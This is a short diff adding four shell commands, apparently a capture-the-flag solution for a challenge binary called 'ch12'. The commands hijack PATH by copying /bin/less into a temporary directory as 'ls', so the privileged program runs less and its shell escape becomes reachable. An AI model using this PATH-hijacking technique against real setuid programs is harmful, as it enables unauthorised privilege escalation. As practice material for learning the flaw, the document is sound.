@@ -1,0 +1,4 @@
+mkdir /tmp/3
+cp /bin/less /tmp/3/ls
+export PATH=/tmp/3
+./ch12
